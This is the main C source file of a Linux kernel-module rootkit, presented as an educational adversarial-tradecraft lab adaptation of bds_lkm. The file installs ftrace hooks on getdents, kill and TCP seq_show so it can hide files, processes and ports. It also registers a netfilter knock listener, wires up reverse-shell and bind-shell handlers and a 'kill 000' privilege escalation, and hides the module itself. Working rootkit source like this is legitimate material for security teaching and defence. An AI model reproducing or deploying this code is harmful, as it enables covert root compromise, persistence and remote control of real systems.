/*
 * blacklodge_lkm — educational LKM rootkit for Adversarial Tradecraft lab
 *
 * Based on bds_lkm (Antonius / bluedragonsecurity) with the following changes:
 *   - Hide prefix changed from "bds_" to "blacklodge_"
 *   - ftrace_regs accessor fixed for Linux 6.12.x (Debian 13 / trixie)
 *   - All hooks (getdents, kill, tcp seq_show) now use pure ftrace
 *     (no CR0 write-protect dance, no direct syscall-table writes)
 *   - Module self-hiding deferred until after hooks are installed
 *   - Intended for isolated NDG lab pods only
 *
 * Features:
 *   - Hides files/dirs whose names contain the prefix "blacklodge_"
 *   - Hides processes whose comm contains "blacklodge_"
 *   - Experimental TCP port hiding (safer seq_show hooks)
 *   - Privilege escalation via "kill 000"
 *   - Module self-hiding
 *
 * Educational use only.
 */

#include "includes/bds_headers.h"
#include "includes/bds_vars.h"
#include "includes/bds_structs.h"
#include "includes/bds_utils.c"
#include "includes/bds_hide.c"
#include "includes/bds_ftrace.h"
#include "includes/bds_getdents.c"
#include "includes/bds_kill.c"
#include "includes/bds_netfilter.c"
#include "includes/bds_hide_port.c"
#include "includes/bds_ftrace_hooks.c"

static int bds_start(void) {
	int err;

	/* Install all ftrace hooks first (getdents, kill, tcp seq_show). */
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err) {
		printk(KERN_ERR "blacklodge_lkm: fh_install_hooks failed (%d)\n", err);
		return err;
	}

	/* Optional netfilter knock listener (harmless if userspace helpers missing). */
	nfho = (struct nf_hook_ops *)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	if (nfho) {
		nfho->hook     = (nf_hookfn *)bds_nf_hook;
		nfho->hooknum  = NF_INET_PRE_ROUTING;
		nfho->pf       = PF_INET;
		nfho->priority = NF_IP_PRI_FIRST;
		nf_register_net_hook(&init_net, nfho);
	}

	INIT_WORK(&do_umode_exec, bds_reverse_shell);
	INIT_WORK(&do_work_bind, bds_bindshell);

	/* Hide the module itself last, after everything else succeeded. */
	bds_hide();

	printk(KERN_INFO "blacklodge_lkm: loaded\n");
	return 0;
}

static void bds_end(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	if (nfho) {
		nf_unregister_net_hook(&init_net, nfho);
		kfree(nfho);
		nfho = NULL;
	}
	printk(KERN_INFO "blacklodge_lkm: unloaded\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adversarial Tradecraft Lab");
MODULE_DESCRIPTION("Educational rootkit for isolated lab use only");
module_init(bds_start);
module_exit(bds_end);
